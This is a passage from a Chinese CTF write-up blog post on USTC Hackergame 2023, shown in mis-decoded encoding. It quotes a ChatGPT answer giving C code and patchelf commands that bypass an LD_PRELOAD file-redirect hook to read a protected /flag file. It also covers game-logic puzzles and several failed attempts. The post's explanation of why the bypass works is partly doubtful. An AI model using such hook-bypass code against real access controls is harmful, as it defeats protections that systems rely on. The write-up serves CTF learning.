æˆ‘çš„CTFæ¯”èµ›é‡Œæœ‰ä¸€é“é¢˜ï¼Œä¸»åŠæ–¹æä¾›äº†ä¸€ä¸ªstage1.so(ä¸Šæ–¹ä»£ç ï¼‰ï¼ŒæŠŠæ‰“å¼€/flagçš„è¯·æ±‚éƒ½å®šå‘åˆ°/fakeflagäº†ï¼Œè¿™æ˜¯dockerfileï¼š
```
COPY --from=builder /lib.so /stage1.so
ENV STAGE=1
RUN echo &#34;I&#39;ll not let you open /flag again!&#34; &gt; /fakeflag
RUN echo &#34;Upload your binary to server to get real flag!&#34; &gt; /flag
```
ä¸»åŠæ–¹æç¤ºè¿™é“é¢˜å¯èƒ½å’ŒLD_PRELOADæœ‰å…³ã€‚ä½ èƒ½å¸®æˆ‘å†™ä¸€ä¸ªlinux ELFæ–‡ä»¶ï¼Œæ¥åšåˆ°è¿™ç‚¹ä»¥åŠè¯»ä¸€ä¸‹flagçš„å†…å®¹å¹¶æ‰“å°å—ã€‚è¯·æ³¨æ„ï¼Œæˆ‘åªèƒ½ä¸Šä¼ ä¸€ä¸ªELFæ–‡ä»¶åˆ°ä¸»åŠæ–¹çš„è¿™ä¸ªdockeræ‰§è¡Œï¼Œè€Œä¸”æˆ‘æ²¡æœ‰åŠæ³•åœ¨å®ƒçš„shellé‡Œè®¾ç½®ä»»ä½•LDå˜é‡ã€‚
</code></pre><p>chatgptçš„å›ç­”ï¼š</p><pre tabindex=0><code>ç”±äºæ‚¨æåˆ°æ— æ³•åœ¨ä¸»åŠæ–¹çš„Dockerç¯å¢ƒä¸­è®¾ç½®ä»»ä½•LDå˜é‡ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä¸€ç§ä¸ä¾èµ–äºç¯å¢ƒå˜é‡çš„æ–¹æ³•æ¥ç»•è¿‡`stage1.so`çš„é™åˆ¶ã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼šæ‚¨å¯ä»¥ç›´æ¥åœ¨ELFæ–‡ä»¶ä¸­ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨çš„æœç´¢è·¯å¾„ã€‚

ä¸‹é¢æ˜¯ä¸€ç§å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼š

1. ç¼–å†™ä¸€ä¸ªCç¨‹åºï¼Œè¯¥ç¨‹åºå°è¯•æ‰“å¼€å¹¶è¯»å–`/flag`æ–‡ä»¶çš„å†…å®¹ã€‚
2. åœ¨Cç¨‹åºä¸­ï¼Œæ·»åŠ ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆä½¿ç”¨`__attribute__((constructor))`ï¼‰ï¼Œåœ¨ä¸»å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚åœ¨è¿™ä¸ªæ„é€ å‡½æ•°ä¸­ï¼Œä½¿ç”¨`dlopen`å’Œ`dlsym`æ¥ç›´æ¥è°ƒç”¨åŸå§‹çš„æ–‡ä»¶æ‰“å¼€å’Œè¯»å–å‡½æ•°ï¼Œç»•è¿‡`stage1.so`çš„é‡å®šå‘ã€‚
3. ç¼–è¯‘è¿™ä¸ªç¨‹åºï¼Œç”Ÿæˆä¸€ä¸ªELFæ–‡ä»¶ã€‚
4. ä½¿ç”¨`patchelf`æˆ–å…¶ä»–å·¥å…·ä¿®æ”¹ELFæ–‡ä»¶ï¼Œå°†åŠ¨æ€é“¾æ¥å™¨çš„æœç´¢è·¯å¾„è®¾ç½®ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ã€‚è¿™æ ·ï¼Œå½“æ‚¨çš„ç¨‹åºå°è¯•åŠ è½½`stage1.so`æ—¶ï¼Œå®ƒå°†æ‰¾ä¸åˆ°è¯¥åº“ï¼Œä»è€Œç»•è¿‡äº†é‡å®šå‘ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹Cç¨‹åºï¼Œå®ƒå°è¯•æ‰“å¼€å¹¶è¯»å–`/flag`æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°ä¸­ç»•è¿‡`stage1.so`çš„é™åˆ¶ï¼š

```c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dlfcn.h&gt;

__attribute__((constructor))
void preload() {
    void *handle = dlopen(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, &#34;Cannot open libc.so.6: %s\n&#34;, dlerror());
        exit(EXIT_FAILURE);
    }

    FILE *(*original_fopen)(const char *, const char *) = dlsym(handle, &#34;fopen&#34;);
    if (!original_fopen) {
        fprintf(stderr, &#34;Cannot find fopen: %s\n&#34;, dlerror());
        exit(EXIT_FAILURE);
    }

    FILE *fp = original_fopen(&#34;/flag&#34;, &#34;r&#34;);
    if (!fp) {
        fprintf(stderr, &#34;Cannot open /flag\n&#34;);
        exit(EXIT_FAILURE);
    }

    char buf[1024];
    if (fgets(buf, sizeof(buf), fp) != NULL) {
        printf(&#34;/flag content: %s&#34;, buf);
    } else {
        fprintf(stderr, &#34;Cannot read from /flag\n&#34;);
    }

    fclose(fp);
    dlclose(handle);
}

int main() {
    printf(&#34;If you see this message, the constructor has finished executing.\n&#34;);
    return 0;
}
```

ç¼–è¯‘è¿™ä¸ªç¨‹åºï¼š

```bash
gcc -o myprogram myprogram.c -ldl
```

ç„¶åä½¿ç”¨`patchelf`ä¿®æ”¹ELFæ–‡ä»¶ï¼š

```bash
patchelf --set-rpath /nonexistent myprogram
```

è¿™æ ·ï¼Œå½“æ‚¨ä¸Šä¼ å¹¶æ‰§è¡Œè¿™ä¸ªELFæ–‡ä»¶æ—¶ï¼Œå®ƒåº”è¯¥èƒ½å¤Ÿç»•è¿‡`stage1.so`çš„é™åˆ¶ï¼Œç›´æ¥æ‰“å¼€å¹¶è¯»å–`/flag`æ–‡ä»¶çš„å†…å®¹ã€‚
</code></pre><p>ChatGPTçš„æ€è·¯åº”è¯¥æ˜¯åˆ¶å®šäº†ä¸€ä¸ªä¸å­˜åœ¨åŠ¨æ€é“¾æ¥å™¨çš„æœç´¢è·¯å¾„ï¼ˆæœ¬è´¨åº”è¯¥å’Œ<code>LD_PRELOAD</code>ç±»ä¼¼ï¼‰ï¼Œè¿™æ ·ç¨‹åºå°±ä¼šæ— è§†ç°æœ‰çš„<code>LD_PRELOAD</code>é‡Œçš„soæ–‡ä»¶äº†ã€‚</p><p>æ²¡æƒ³åˆ°æŠŠChatGPTçš„ä»£ç äº¤ä¸Šå»ä¹‹åå°±ä¸€æ¬¡æ‹¿åˆ°flagäº†ã€‚</p><h2 id=å¼‚æ˜Ÿæ­§é€”>å¼‚æ˜Ÿæ­§é€”<a hidden class=anchor aria-hidden=true href=#å¼‚æ˜Ÿæ­§é€”>#</a></h2><p>ä¸‹è½½æ¸¸æˆç©ä¸€ç©ä¹‹åï¼Œå¯ä»¥æ³¨æ„åˆ°æ¯8ä¸ªå¼€å…³éƒ½æ˜¯ç”±ä¸€ä¸ª<a href=https://mindustry-unofficial.fandom.com/wiki/Guide:_Logic_Basics>processor</a>æ§åˆ¶çš„ã€‚</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/mindustry-1.jpg alt=å¤„ç†å™¨çš„å…³è”å»ºç­‘><figcaption>å¤„ç†å™¨çš„å…³è”å»ºç­‘</figcaption></figure></p><p>ç‚¹è¿›ç¼–è¾‘ä¹‹åå¯ä»¥çœ‹åˆ°è‹¥å¹²é€»è¾‘å›¾ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥å¤åˆ¶å‡ºæ–‡æœ¬çœ‹ã€‚</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/mindustry-logic.png alt=é€»è¾‘ç•Œé¢><figcaption>é€»è¾‘ç•Œé¢</figcaption></figure></p><h3 id=ç¬¬ä¸€ç»„>ç¬¬ä¸€ç»„<a hidden class=anchor aria-hidden=true href=#ç¬¬ä¸€ç»„>#</a></h3><pre tabindex=0><code>sensor s1 switch1 @enabled
sensor s2 switch2 @enabled
sensor s3 switch3 @enabled
sensor s4 switch4 @enabled
sensor s5 switch5 @enabled
sensor s6 switch6 @enabled
sensor s7 switch7 @enabled
sensor s8 switch8 @enabled
jump 18 equal s1 false
jump 18 equal s2 true
jump 18 equal s3 false
jump 18 equal s4 true
jump 18 equal s5 true
jump 18 equal s6 false
jump 18 equal s7 true
jump 18 equal s8 false
control enabled generator1 1 0 0 0
end
control enabled generator1 0 0 0 0
end
</code></pre><p>å¯ä»¥çœ‹å‡ºS1åˆ°S8éœ€è¦æŒ‰ç…§<code>10100101</code>é…ç½®å°±èƒ½å¯åŠ¨<code>generator1</code>ã€‚</p><h3 id=ç¬¬äºŒç»„>ç¬¬äºŒç»„<a hidden class=anchor aria-hidden=true href=#ç¬¬äºŒç»„>#</a></h3><pre tabindex=0><code>sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
op shl t sw1 7
set number t
op shl t sw2 6
op add number number t
op shl t sw3 5
op add number number t
op shl t sw4 4
op add number number t
op shl t sw5 3
op add number number t
op shl t sw6 2
op add number number t
op shl t sw7 1
op add number number t
set t sw8
op add number number t
set en 0
set i 0
jump 33 greaterThanEq i 16
op pow fl0 i 2
jump 31 notEqual fl0 number
set en 1
jump 33 always x false
op add i i 1
jump 26 always x false
op equal fl1 0 sw1
op equal fl2 0 sw6
op or fl3 fl1 fl2
jump 38 equal fl3 0
set en 0
control enabled generator1 en 0 0 0
control enabled panel1 en 0 0 0
end
</code></pre><ul><li><code>number</code>æ˜¯ç”¨ä½ç§»ç”Ÿæˆçš„ï¼Œå¤§æ¦‚ç±»ä¼¼äº<code>number = sw1*128 + sw2*64 + sw3*32 + sw4*16 + sw5*8 + sw6*4 + sw7*2 + sw8*1</code>ï¼Œç„¶ånumberéœ€è¦æ˜¯ä¸€ä¸ªå°äº225çš„å¹³æ–¹æ•°ã€‚</li><li><code>sw1</code>å’Œ<code>sw6</code>éœ€è¦æ˜¯å¼€çŠ¶æ€ï¼ˆç›¸å½“äºå·²ç»æœ‰128+4=132äº†ï¼‰ï¼Œæ³¨æ„åˆ°196=14^2ï¼›196-132=64ï¼Œé‚£æ‰“å¼€<code>sw2</code>å°±å¯ä»¥äº†ã€‚</li></ul><p><code>11000100</code></p><h3 id=ç¬¬ä¸‰ç»„>ç¬¬ä¸‰ç»„<a hidden class=anchor aria-hidden=true href=#ç¬¬ä¸‰ç»„>#</a></h3><pre tabindex=0><code>sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
sensor sw9 switch9 @enabled
control enabled conveyor2 sw1 0 0 0
control enabled gate1 sw2 0 0 0
op equal nsw3 sw3 0
control enabled reactor1 nsw3 0 0 0
control enabled reactor2 nsw3 0 0 0
control enabled conduit1 sw4 0 0 0
control enabled conduit2 sw4 0 0 0
control enabled mixer1 sw5 0 0 0
control enabled extractor1 sw6 0 0 0
control enabled meltdown1 sw7 0 0 0
control enabled meltdown2 sw7 0 0 0
op equal result sw8 sw9
jump 28 equal result true
control enabled mixer1 0 0 0 0
control enabled conduit2 1 0 0 0
control enabled reactor1 1 0 0 0
control enabled reactor2 1 0 0 0
control enabled conveyor2 1 0 0 0
wait 5
end
</code></pre><p>ç›®æ ‡ï¼šæ‰“å¼€extractor1ï¼Œmixer1ï¼Œreactor1ï¼Œreactor2ï¼Œconveyor2ï¼Œgate1ï¼Œä½†ä¸èƒ½æ‰“å¼€conduit1ï¼Œconduit2</p><ul><li><p>1-8 è¡Œï¼šå®šä¹‰äº†8ä¸ªä¼ æ„Ÿå™¨ï¼Œå¹¶å°†å®ƒä»¬è¿æ¥åˆ°å„è‡ªçš„å¼€å…³ï¼ˆswitch1 - switch9ï¼‰ä¸Šï¼Œè¿™äº›å¼€å…³è¢«å‘½åä¸ºsw1åˆ°sw9ã€‚</p></li><li><p>9-14 è¡Œï¼šè¿™äº›è¡Œè®¾ç½®äº†å‡ ä¸ªå»ºç­‘çš„æ§åˆ¶é€»è¾‘ã€‚<code>control enabled</code> å‘½ä»¤ç”¨äºå¯ç”¨æˆ–ç¦ç”¨ç‰¹å®šçš„å»ºç­‘ã€‚å»ºç­‘çš„å¯ç”¨/ç¦ç”¨çŠ¶æ€å–å†³äºç›¸åº”ä¼ æ„Ÿå™¨çš„çŠ¶æ€ï¼ˆ0ä»£è¡¨ç¦ç”¨ï¼Œ1ä»£è¡¨å¯ç”¨ï¼‰ã€‚åœ¨è¿™äº›è¡Œä¸­ï¼Œå½“ä¼ æ„Ÿå™¨çš„çŠ¶æ€ä¸º1ï¼ˆå³å¼€å…³è¢«æ¿€æ´»ï¼‰æ—¶ï¼Œç›¸åº”çš„å»ºç­‘ä¼šè¢«å¯ç”¨ã€‚</p></li><li><p>15-16 è¡Œï¼šåˆ›å»ºäº†ä¸€ä¸ªåä¸ºnsw3çš„æ–°å˜é‡ï¼Œå¹¶å°†å…¶å€¼è®¾ç½®ä¸ºä¸sw3ç›¸ç­‰ã€‚è¿™æ„å‘³ç€nsw3çš„å€¼å°†æ ¹æ®sw3çš„çŠ¶æ€å˜åŒ–ã€‚</p></li><li><p>17-20 è¡Œï¼šå½“nsw3ä¸º1ï¼ˆå³sw3è¢«æ¿€æ´»ï¼‰æ—¶ï¼Œå¯ç”¨reactor1ã€reactor2ã€conduit1å’Œconduit2ã€‚</p></li><li><p>21-23 è¡Œï¼šå½“sw5ä¸º1æ—¶ï¼Œå¯ç”¨mixer1ï¼›å½“sw6ä¸º1æ—¶ï¼Œå¯ç”¨extractor1ï¼›å½“sw7ä¸º1æ—¶ï¼Œå¯ç”¨meltdown1å’Œmeltdown2ã€‚<strong>â€”â€”æ‰“å¼€sw5ï¼Œsw6</strong></p></li><li><p>24-26 è¡Œï¼šæ¯”è¾ƒsw8å’Œsw9çš„çŠ¶æ€ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨å˜é‡resultä¸­ã€‚å¦‚æœsw8å’Œsw9éƒ½æ˜¯1æˆ–éƒ½æ˜¯0ï¼Œresultå°†ä¸ºtrueã€‚<strong>â€”â€”sw8å·²ç»å…³äº†ï¼Œæ‰€ä»¥sw9ä¹Ÿè¦å…³ä¸Š</strong></p></li><li><p>27 è¡Œï¼šå¦‚æœresultä¸ºtrueï¼ˆå³sw8å’Œsw9çš„çŠ¶æ€ç›¸ç­‰ï¼‰ï¼Œåˆ™è·³è½¬åˆ°ç¬¬28è¡Œã€‚</p></li><li><p>28-33 è¡Œï¼šå¦‚æœè·³è½¬å‘ç”Ÿï¼Œè¿™äº›è¡Œå°†è¢«æ‰§è¡Œã€‚è¿™äº›è¡Œå°†ç¦ç”¨mixer1ï¼Œå¯ç”¨conduit2ã€reactor1ã€reactor2å’Œconveyor2ã€‚</p></li><li><p>34 è¡Œï¼šç­‰å¾…5ä¸ªæ¸¸æˆé€»è¾‘å¸§ã€‚</p></li><li><p>35 è¡Œï¼šè„šæœ¬ç»“æŸã€‚</p></li><li><p>sw1æ§åˆ¶conveyor2ã€‚<strong>â€”â€”æ‰“å¼€sw1</strong></p></li></ul><p><code>10001100</code></p><p>å…¶ä»–æ–¹æ³•ï¼š<del>æœåŠ¡å™¨å…è®¸10ç§’æäº¤ä¸€æ¬¡åºåˆ—ï¼Œ8ä½äºŒè¿›åˆ¶æ•°ä¸€å…±å°±256ç§ç»„åˆï¼Œè¿è¡Œä¸€ä¸ªå°æ—¶å°±èƒ½æ’å‡ºæ¥äº†</del></p><h3 id=ç¬¬å››ç»„>ç¬¬å››ç»„<a hidden class=anchor aria-hidden=true href=#ç¬¬å››ç»„>#</a></h3><p>æ­£å¥½è¯•å‡ºæ¥äº†<code>01110111</code></p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/mindustry-2.jpg alt=æˆåŠŸè¿è¡Œåçš„çŠ¶æ€><figcaption>æˆåŠŸè¿è¡Œåçš„çŠ¶æ€</figcaption></figure></p><h1 id=æ²¡åšå‡ºä½†å°è¯•è¿‡çš„éƒ¨åˆ†>æ²¡åšå‡ºï¼Œä½†å°è¯•è¿‡çš„éƒ¨åˆ†<a hidden class=anchor aria-hidden=true href=#æ²¡åšå‡ºä½†å°è¯•è¿‡çš„éƒ¨åˆ†>#</a></h1><h2 id=å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ-1>å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ<a hidden class=anchor aria-hidden=true href=#å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ-1>#</a></h2><h3 id=hackergameå’Œ>Hackergameå’ŒğŸ®<a hidden class=anchor aria-hidden=true href=#hackergameå’Œ>#</a></h3><p>å°è¯•äº†æŠŠ<code>hackergame</code> tokenåŒ–ï¼Œä¼šè¢«æ‹†æˆ<code>h</code>, <code>acker</code>, <code>game</code>ã€‚ä¸è¿‡è®­ç»ƒé›†é‡Œçš„ackerå¯¹åº”çš„å•è¯åŸºæœ¬éƒ½æ˜¯crackerã€‚åˆ°æ­¤å°±æ²¡æœ‰æ€è·¯äº†ã€‚</p><h2 id=ä½å¸¦å®½æ˜Ÿçƒ-1>ä½å¸¦å®½æ˜Ÿçƒ<a hidden class=anchor aria-hidden=true href=#ä½å¸¦å®½æ˜Ÿçƒ-1>#</a></h2><h3 id=æè‡´å‹ç¼©>æè‡´å‹ç¼©<a hidden class=anchor aria-hidden=true href=#æè‡´å‹ç¼©>#</a></h3><p>å°è¯•äº†è‹¥å¹²ç§libvipsæ”¯æŒçš„æ— æŸå‹ç¼©æ ¼å¼ï¼Œæ— æœï¼Œç”šè‡³å°è¯•äº†imagemagickçš„<a href=https://legacy.imagemagick.org/Usage/canvas/>canvas</a>ï¼Œä¸è¿‡libvipså¹¶ä¸æ”¯æŒã€‚æ€€ç–‘æ­£ç¡®çš„è§£é¢˜æ–¹æ³•åº”è¯¥æ˜¯ä¸Šä¼ æŸç§ç‰¹åœ°æ„é€ çš„äºŒè¿›åˆ¶ã€‚</p><table><thead><tr><th>Type</th><th>Size</th></tr></thead><tbody><tr><td>PNG</td><td>~2kb</td></tr><tr><td>AVIF (AV1)</td><td>~2kb</td></tr><tr><td>HEIF (HEVC)</td><td>552b</td></tr><tr><td>WEBP (VP8)</td><td>176b</td></tr><tr><td>EPS</td><td>~300b</td></tr><tr><td>SVG</td><td>170b</td></tr><tr><td>SVGZ (GZIP)</td><td>120b</td></tr></tbody></table><h2 id=o1-ç”¨æˆ·ç™»å½•ç³»ç»Ÿ>O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ<a hidden class=anchor aria-hidden=true href=#o1-ç”¨æˆ·ç™»å½•ç³»ç»Ÿ>#</a></h2><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š<a href="https://news.ycombinator.com/item?id=16572793">Attacking Merkle Trees with a second preimage attack | Hacker News (ycombinator.com)</a>ï¼Œä½†æ„é€ æ–°çš„ï¼Œå…·æœ‰ä¸€è‡´hashçš„Merkle treeï¼ˆä¸ªäººè®¤ä¸ºç®—<a href="https://en.wikipedia.org/w/index.php?title=Second-preimage_attack&amp;redirect=no">Second-preimage attack</a>ï¼Ÿï¼‰ä¹Ÿæ˜¯ä¸€ä»¶è®¡ç®—å¯†é›†çš„äº‹æƒ…ã€‚</p><p>æœ‰å…³æ’SHA1ç¬”è€…ä¹Ÿæ‰¾åˆ°äº†<a href=https://ctf-wiki.org/crypto/hash/sha1/>SHA1 - CTF Wiki (ctf-wiki.org)</a>è¿™ç¯‡æ–‡ç« ï¼Œå…¶ä¸­æåˆ°å¯ä»¥ç”¨googleæä¾›çš„é‚£ä¸¤ä¸ªSHA1ä¸€è‡´çš„PDFåˆ›å»ºä¸€ä¸ªSHA1ä¸€æ ·çš„æ–‡ä»¶ï¼Œä½†è¿™ä¸ªæ–‡ä»¶è‡³å°‘è¦320bytesï¼Œä¸ç¬¦åˆæ–‡ä¸­æåˆ°çš„å¸å·å¯†ç é•¿åº¦è¦å°äº100çš„è¦æ±‚ï¼ˆè€Œä¸”ä¹Ÿä¸åŒ…å«<code>:</code>ï¼‰</p><h2 id=å°-z-çš„è°œé¢˜>å° Z çš„è°œé¢˜<a hidden class=anchor aria-hidden=true href=#å°-z-çš„è°œé¢˜>#</a></h2><p>è¿™é“é¢˜ç†è®ºä¸Šåº”è¯¥å¯ä»¥è½¬æˆç«‹ä½“å‡ ä½•æˆ–è€…<a href=https://en.wikipedia.org/wiki/Bin_packing_problem>3D Bin Packing</a>é—®é¢˜ï¼Œä½†è¿™æ˜¯ä¸ªNP Hardé—®é¢˜ï¼Œè‡ªå·±å°è¯•äº†ä¸€äº›ç”¨è¿‘ä¼¼ç®—æ³•çš„è½¯ä»¶æˆ–ç€è‡ªå·±åšä¹Ÿæ²¡èƒ½åšå‡ºæ¥ï¼Œæœ€æ¥è¿‘çš„ç»“æœæ˜¯ä¸‹é¢è¿™å¼ å›¾ï¼ˆå·®äº†ä¸€ä¸ª<code>1*2*2</code>çš„æ–¹å—ï¼‰:</p><iframe src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/puzzle_z_try.html height=500 width=500></iframe><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/puzzle-z-plotly.png alt=ç”»å‡ºæ¥çš„æ‹¼æ¥æ–¹æ¡ˆ><figcaption>ç”»å‡ºæ¥çš„æ‹¼æ¥æ–¹æ¡ˆ</figcaption></figure></p><h3 id=æ ‡å‡†è§£ç­”æ–¹æ¡ˆçš„å¯è§†åŒ–>æ ‡å‡†è§£ç­”æ–¹æ¡ˆçš„å¯è§†åŒ–ï¼š<a hidden class=anchor aria-hidden=true href=#æ ‡å‡†è§£ç­”æ–¹æ¡ˆçš„å¯è§†åŒ–>#</a></h3><iframe src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/puzzle_z_flag1.html height=500 width=500></iframe>
<iframe src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/puzzle_z_flag2.html height=500 width=500></iframe>
<iframe src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/puzzle_z_flag3.html height=500 width=500></iframe></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.sparktour.me/tags/tech/>Tech</a></li></ul><nav class=paginav><a class=prev href=https://blog.sparktour.me/posts/2023/12/31/2023-in-photos/><span class=title>Â« ä¸Šä¸€é¡µ</span><br><span>ç…§ç‰‡é‡Œçš„2023</span>
</a><a class=next href=https://blog.sparktour.me/posts/2023/10/18/mikrotik-routeros-openwrt-ipv6-prefix-delegation/><span class=title>ä¸‹ä¸€é¡µ Â»</span><br><span>ä½¿ç”¨ Mikrotik RouterOS å’Œ Openwrt åœ¨ ISP è·å¾—çš„ IPv6 Prefix ä¸Šé…ç½®äºŒçº§ PD</span></a></nav></footer><div class="callout callout-default"><img src=https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by-nc-sa.svg alt="CC BY-NC-SA 4.0" style=width:88px;height:31px><p style=font-size:12px>Licensed Under <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noopener>CC BY-NC-SA 4.0</a></p><p style=font-size:12px>Post Link: <a href=https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/ target=_blank rel=noopener>https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/</a></p></div><script src=https://s4.zstatic.net/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js crossorigin=anonymous></script><div id=disqusjs></div><script>const disqusjs=new DisqusJS({shortname:"sparktour",siteName:"",identifier:"",url:"",title:"",api:"https://disqus.com/api/",apikey:"QhJnXpS5igyHkjYQ91XYC4dSAuEJYAEsHX8hjLrRc1HU9AApOHLrqkwwIp2sKOLk",admin:"",adminLabel:""});disqusjs.render(document.getElementById("disqusjs"))</script></article></main><footer class=footer><span>&copy; 2026 <a href=https://blog.sparktour.me/>Sparktour's Blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="å¤åˆ¶";function s(){t.innerHTML="å·²å¤åˆ¶ï¼",setTimeout(()=>{t.innerHTML="å¤åˆ¶"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>